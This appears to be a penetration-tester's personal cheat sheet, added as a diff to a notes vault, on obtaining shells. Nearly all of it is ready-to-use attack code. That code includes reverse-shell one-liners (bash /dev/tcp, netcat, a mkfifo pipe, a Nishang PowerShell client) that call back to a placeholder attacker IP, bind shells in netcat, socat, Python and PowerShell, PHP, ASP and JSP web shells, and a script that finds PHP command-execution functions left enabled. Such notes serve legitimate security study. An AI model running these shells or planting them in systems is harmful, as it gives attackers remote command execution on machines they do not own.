@@ -1,0 +1,224 @@
+---
+Primary_category: "[[PENTESTING ROOT]]"
+title: "SHELLS AND PAYLOADS"
+draft: false
+banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
+banner_y: 0.88286
+tags: 
+cssclasses:
+---
+
+###### PRIMARY CATEGORY → [[PENTESTING ROOT]]
+
+#### Reverse Shell
+
+> ***[Pentest Monkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)&nbsp;&nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;&nbsp;[PayloadAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)&nbsp;&nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;&nbsp;[Reference I](https://highon.coffee/blog/reverse-shell-cheat-sheet/)***
+
+The *Compromised Target* connects to the *Attacker Host* through a *Listening Socket*
+
+##### Listening Socket
+
+> ***Attacker*** 🗡️
+
+First, set a *Listening Socket* in the *Attacker Host* →
+
+###### *Netcat*
+
+- ***Linux Target***
+
+```bash
+nc -nlvp <PORT>
+```
+
+- ***Windows Target***
+
+```bash
+rlwrap -CaR nc -nlvp <PORT>
+rlwrap -cN -H 1000 nc -nlvp <PORT>
+```
+
+###### *Pwncat*
+
+- ***Installation***
+
+```bash
+python -m venv pwncat-venv
+source !$/bin/activate
+pip install pwncat-cs
+```
+
+- ***Listen for a Reverse Shell***
+
+```bash
+pwncat-cs -lp <PORT>
+```
+
+##### Reverse Connection
+
+> ***Target*** 🎯
+
+Once the *Listening Socket* has been set up, just proceed to connect to it from the *Target* as follows →
+
+###### *Bash /dev/tcp*
+
+```bash title /<IP_ADDRESS>/ /<PORT>/
+bash -c "bash -i &> /dev/tcp/<IP_ADDRESS>/<PORT> 0>&1"
+```
+
+###### *Netcat Traditional*
+
+```bash /<IP_ADDRESS>/ /<PORT>/
+nc -e /bin/bash <IP_ADDRESS> <PORT>
+```
+
+###### *Netcat OpenBSD*
+
+```bash /<IP_ADDRESS>/ /<PORT>/
+rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f|/bin/bash -i 2>&1 | nc <IP_ADDRESS> <PORT> >/tmp/f
+```
+
+###### *Powershell*
+
+- ***[Nishang Reverse Shell Oneliner](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1)***
+
+```powershell /<IP_ADDRESS>/ /<PORT>/
+$client = New-Object System.Net.Sockets.TCPClient('<IP_ADDRESS>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+---
+
+#### Bind Shell
+
+> ***[PayloadAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/)***
+
+The *Attacker Host* connects to a *Listening Socket* in the *Target*
+
+##### Listening Socket
+
+> ***Target*** 🎯
+
+###### *Netcat Traditional*
+
+```bash /<PORT>/
+nc -nlvp <PORT> -e /bin/bash
+```
+
+###### *Netcat OpenBSD*
+
+```bash /<PORT>/
+rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/bash -i 2>&1 | nc -nlvp <PORT> >/tmp/f
+```
+
+###### *Socat*
+
+> ***[Static Binaries](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat)
+> See [[FILE TRANSFERS|this]] to transfer it to the Target***
+
+```bash /<PORT>/
+socat TCP-LISTEN:<PORT>,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
+```
+
+###### *Python*
+
+```python /<PORT>/
+python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",<PORT>));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
+```
+
+###### *Powershell*
+
+- ***[Nishang Bind Shell Oneliner](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLineBind.ps1)***
+
+```powershell /<PORT>/
+$listener = [System.Net.Sockets.TcpListener]<PORT>;$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()
+```
+
+##### Connection Stablisher
+
+> ***Attacker*** 🗡️
+
+###### *Netcat*
+
+```bash
+nc <IP_ADDRESS> <PORT>
+```
+
+###### *Socat*
+
+```bash
+socat FILE:`tty`,raw,echo=0 TCP:<TARGET>:<PORT>
+```
+
+---
+
+#### Web Shell
+
+Communication through a **Web Server** to get *Remote Command Execution (RCE)*
+
+It accepts the *System Commands* via *HTTP Parameters (GET/POST)*, executes them and prints back its output on the web page
+
+##### *PHP*
+
+```php
+<?php system($_GET['cmd']); ?> // or $_REQUEST
+<?php echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>" ;
+```
+
+###### *Disable Functions Enumeration*
+
+> ***[Reference](https://github.com/teambi0s/dfunc-bypasser/tree/master)***
+
+To check for *dangerous functions* that are not disabled, i.e. *php functions* that allow system-level command execution
+
+> [!DANGER]- *CheckDisabledFunctions.php*
+>
+> ```php
+> <?php
+> function getEnabledFunctions () {
+>     
+>     $commandFunctions = [
+>         'pcntl_alarm','pcntl_fork','pcntl_waitpid','pcntl_wait','pcntl_wifexited','pcntl_wifstopped','pcntl_wifsignaled',
+>         'pcntl_wifcontinued','pcntl_wexitstatus','pcntl_wtermsig','pcntl_wstopsig','pcntl_signal','pcntl_signal_get_handler',
+>         'pcntl_signal_dispatch','pcntl_get_last_error','pcntl_strerror','pcntl_sigprocmask','pcntl_sigwaitinfo','pcntl_sigtimedwait',
+>         'pcntl_exec','pcntl_getpriority','pcntl_setpriority','pcntl_async_signals','error_log','system','exec','shell_exec',
+>         'popen','proc_open','passthru','link','symlink','syslog','ld','mail'
+>     ];
+> 
+>     $disabledFunctions = array_map('trim', explode(',', ini_get('disable_functions')));
+>     $enabledFunctions = array_diff($commandFunctions, $disabledFunctions);
+> 
+>     if (!empty($enabledFunctions)) {
+>         foreach ($enabledFunctions as $function) {
+>             echo "Function enabled ->" . $function . "<br>";
+>         }
+>     }
+> }
+>
+> getEnabledFunctions();
+> ?>
+> ```
+>
+
+##### *ASP*
+
+```asp
+<% eval request("cmd") %>
+```
+
+##### *JSP*
+
+```jsp
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+```
+
+##### *Common Web Server System Paths*
+
+These *Web Shell* have to be uploaded to the *Web Server* in order to be able to execute it
+
+**Webroots for Common Web Servers →**
+
+| **WEB SERVER** | **DEFAULT WEBROOT** |
+| --- | --- |
+| ***Apache*** | **`/var/www/html/`** |
+| ***Nginx*** | **`/usr/local/nginx/html/`** |
+| ***IIS*** | **`C:\inetpub\wwwroot\`** |
+| ***XAMPP*** | **`C:\xampp\htdocs\`** |
